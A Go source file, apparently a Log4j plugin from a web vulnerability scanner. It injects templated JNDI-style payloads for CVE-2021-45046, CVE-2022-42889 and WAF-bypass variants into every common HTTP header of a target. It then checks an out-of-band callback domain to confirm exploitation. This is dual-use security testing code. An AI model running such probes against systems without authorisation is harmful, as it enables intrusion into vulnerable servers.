package log4j

import (
	JieOutput "github.com/yhy0/ChYing/pkg/Jie/pkg/output"
	"github.com/yhy0/ChYing/pkg/Jie/pkg/protocols/httpx"
	"github.com/yhy0/ChYing/pkg/Jie/pkg/reverse"
	"strings"
	"time"
)

/**
   @author yhy
   @since 2023/5/15
   @desc //TODO
**/

func Scan(target, method, body string, client *httpx.Client) {
	dig := reverse.GetSubDomain()
	if dig == nil {
		return
	}
	payloads := generate_waf_bypass_payloads(dig.Domain, dig.Key)

	payloads = append(payloads, get_cve_2021_45046_payloads(dig.Domain, dig.Key)...)
	payloads = append(payloads, get_cve_2022_42889_payloads(dig.Domain, dig.Key)...)

	for _, payload := range payloads {
		var headers = make(map[string]string, len(commonHeaders))
		for _, header := range commonHeaders {
			headers[header] = payload
		}
		_, err := client.Request(target, method, body, headers, "Poc Log4j")
		if err != nil {
			continue
		}
	}

	if reverse.PullLogs(dig) {
		JieOutput.OutChannel <- JieOutput.VulMessage{
			DataType: "web_vul",
			Plugin:   "Log4j",
			VulnData: JieOutput.VulnData{
				CreateTime: time.Now().Format("2006-01-02 15:04:05"),
				Target:     target,
				Ip:         "",
				Response:   dig.Msg,
				Payload:    dig.Key + "  " + dig.Token,
			},
			Level: JieOutput.Critical,
		}
	}
}

func generate_waf_bypass_payloads(callback_host, randstr string) []string {
	var payloads []string
	for _, i := range waf_bypass_payloads {
		payload := strings.ReplaceAll(i, "{{callback_host}}", callback_host)
		payload = strings.ReplaceAll(payload, "{{random}}", randstr)
		payloads = append(payloads, payload)
	}
	return payloads
}

func get_cve_2021_45046_payloads(callback_host, randstr string) []string {
	var payloads []string
	for _, i := range cve_2021_45046 {
		payload := strings.ReplaceAll(i, "{{callback_host}}", callback_host)
		payload = strings.ReplaceAll(payload, "{{random}}", randstr)
		payloads = append(payloads, payload)
	}
	return payloads
}

func get_cve_2022_42889_payloads(callback_host, randstr string) []string {
	var payloads []string
	for _, i := range cve_2022_42889 {
		payload := strings.ReplaceAll(i, "{{callback_host}}", callback_host)
		payload = strings.ReplaceAll(payload, "{{random}}", randstr)
		payloads = append(payloads, payload)
	}
	return payloads
}
